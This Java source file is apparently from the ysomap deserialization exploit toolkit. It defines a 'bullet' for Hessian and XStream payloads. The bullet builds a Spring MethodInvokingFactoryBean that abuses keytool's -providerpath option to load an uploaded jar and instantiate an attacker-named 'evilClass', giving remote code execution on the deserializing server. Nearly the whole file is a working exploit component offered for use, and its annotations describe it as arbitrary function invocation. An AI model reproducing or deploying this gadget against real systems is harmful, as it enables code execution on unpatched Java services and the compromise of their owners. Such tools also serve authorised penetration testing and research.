package ysomap.bullets.spring;

import org.springframework.beans.factory.config.MethodInvokingFactoryBean;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

import java.lang.reflect.Method;

/**
 * @author wh1t3p1g
 * @since 2022/5/16
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("任意函数调用")
@Targets({Targets.HESSIAN, Targets.XSTREAM})
@Dependencies({"org.springframework:spring-context"})
public class SpringLoadJarBullet extends SpringExecBullet {

    @NotNull
    @Require(name = "filepath", detail = "上传至目标环境的jar路径")
    public String filepath;

    @NotNull
    @Require(name = "evilClass", detail = "需要初始化的对象，默认调用无参构造函数")
    public String evilClass;

    private String beanName = "ysomap";

    public Object makeBean() throws Exception {
        MethodInvokingFactoryBean bean = new MethodInvokingFactoryBean();
        bean.setSingleton(false);
        bean.setTargetObject(Runtime.getRuntime());
        Class cls = sun.security.tools.keytool.Main.class;
        Method method = cls.getMethod("main", String[].class);
        ReflectionHelper.setFieldValue(bean, "methodObject", method);
        ReflectionHelper.setFieldValue(bean, "beanClassLoader", null);
        Object[] evilargs = new Object[]{new String[]{
                "-LIST", "-provider:",
                evilClass,
                "-keystore", "NONE", "-protected", "-debug", "-providerpath",
                filepath
        }};
        bean.setArguments(evilargs);
        return bean;
    }

    public static SpringLoadJarBullet newInstance(Object... args) throws Exception {
        SpringLoadJarBullet bullet = new SpringLoadJarBullet();
        bullet.set("filepath", args[0]);
        bullet.set("evilClass", args[1]);
        return bullet;
    }
}
